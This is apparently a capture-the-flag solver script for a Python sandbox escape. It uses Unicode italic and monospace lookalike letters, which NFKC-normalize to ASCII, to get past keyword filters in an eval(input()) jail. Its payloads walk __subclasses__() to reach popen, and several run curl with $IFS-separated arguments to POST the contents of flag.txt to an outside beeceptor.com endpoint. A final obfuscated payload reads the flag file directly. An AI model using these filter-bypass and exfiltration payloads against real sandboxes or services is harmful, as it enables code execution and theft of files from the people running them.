import unicodedata

b = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
d = {}
for i in range(0x110000):
    c = chr(i)
    x = unicodedata.normalize('NFKC', c)
    if x != c and x in b:
        d[x] = c 

def form_word(word):
    w = ""
    for c in word:
        w += d.get(c, c)
    print(w)

payload = """
().__class__.__base__.__subclasses__()[140].__init__.__globals__["popen"]("curl$IFS-X$IFSPOST$IFS-d$IFS`cat$IFS./flag.txt`$IFShttps://asdfasdfasdf.free.beeceptor.com")
().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__["𝘱𝘰𝘱𝘦𝘯"]("𝘤𝘶𝘳𝘭 -𝘟 𝘗𝘖𝘚𝘛 -𝘥 `𝘤𝘢𝘵 ./𝘧𝘭𝘢𝘨.𝘵𝘹𝘵` 𝘩𝘵𝘵𝘱𝘴://𝘢𝘴𝘥𝘧𝘢𝘴𝘥𝘧𝘢𝘴𝘥𝘧.𝘧𝘳𝘦𝘦.𝘣𝘦𝘦𝘤𝘦𝘱𝘵𝘰𝘳.𝘤𝘰𝘮")


a="${IFS}";f"{a}" 𝘢
().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__["𝘱𝘰𝘱𝘦𝘯"]("𝘤𝘶𝘳𝘭$𝘐𝘍𝘚-𝘟$𝘐𝘍𝘚𝘗𝘖𝘚𝘛$𝘐𝘍𝘚-𝘥$𝘐𝘍𝘚`𝘤𝘢𝘵$𝘐𝘍𝘚./𝘧𝘭𝘢𝘨.𝘵𝘹𝘵`$𝘐𝘍𝘚𝘩𝘵𝘵𝘱𝘴://𝘢𝘴𝘥𝘧𝘢𝘴𝘥𝘧𝘢𝘴𝘥𝘧.𝘧𝘳𝘦𝘦.𝘣𝘦𝘦𝘤𝘦𝘱𝘵𝘰𝘳.𝘤𝘰𝘮")
().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__["𝘱𝘰𝘱𝘦𝘯"]
"""
payload = """().__class__.__base__.__subclasses__()[140].__init__.__globals__["popen"]("curl$IFS-X$IFSPOST$IFS-d$IFS`cat$IFS./flag.txt`$IFShttps://asdfasdfasdf.free.beeceptor.com")"""
payload = """().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__["𝘱𝘰𝘱𝘦𝘯"]"""
form_word(payload)
# ().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__["𝘱𝘰𝘱𝘦𝘯"]
# ().__𝚌𝚕𝚊𝚜𝚜__.__𝚋𝚊𝚜𝚎__.__𝚜𝚞𝚋𝚌𝚕𝚊𝚜𝚜𝚎𝚜__()[140].__𝚒𝚗𝚒𝚝__.__𝚐𝚕𝚘𝚋𝚊𝚕𝚜__["𝚙𝚘𝚙𝚎𝚗"]("𝚌𝚞𝚛𝚕$🄸🄵🅂-🅇$🄸🄵🅂🄿🄾🅂🅃$🄸🄵🅂-𝚍$🄸🄵🅂`𝚌𝚊𝚝$🄸🄵🅂./𝚏𝚕𝚊𝚐.𝚝𝚡𝚝`$🄸🄵🅂𝚑𝚝𝚝𝚙𝚜://𝚊𝚜𝚍𝚏𝚊𝚜𝚍𝚏𝚊𝚜𝚍𝚏.𝚏𝚛𝚎𝚎.𝚋𝚎𝚎𝚌𝚎𝚙𝚝𝚘𝚛.𝚌𝚘𝚖")

# 𝚙𝚛𝚒𝚗𝚝
# eval(input())
# ().__𝚌𝚕𝚊𝚜𝚜__.__𝚋𝚊𝚜𝚎__.__𝚜𝚞𝚋𝚌𝚕𝚊𝚜𝚜𝚎𝚜__()[140].__𝚒𝚗𝚒𝚝__.__𝚐𝚕𝚘𝚋𝚊𝚕𝚜__["𝚙𝚘𝚙𝚎𝚗"]("𝚌𝚞𝚛𝚕 -🅇 🄿🄾🅂🅃 -𝚍 `𝚌𝚊𝚝 ./𝚏𝚕𝚊𝚐.𝚝𝚡𝚝` 𝚑𝚝𝚝𝚙𝚜://𝚊𝚜𝚍𝚏𝚊𝚜𝚍𝚏𝚊𝚜𝚍𝚏.𝚏𝚛𝚎𝚎.𝚋𝚎𝚎𝚌𝚎𝚙𝚝𝚘𝚛.𝚌𝚘𝚖")



"""
final payload 


[*[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][6].𝘷𝘢𝘭𝘶𝘦𝘴()][42]([*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]("{} ./????.???".𝘧𝘰𝘳𝘮𝘢𝘵(().__𝘥𝘰𝘤__[-3] + ().__𝘥𝘰𝘤__[-11] + ().__𝘥𝘰𝘤__[-2])).𝘳𝘦𝘢𝘥())

"""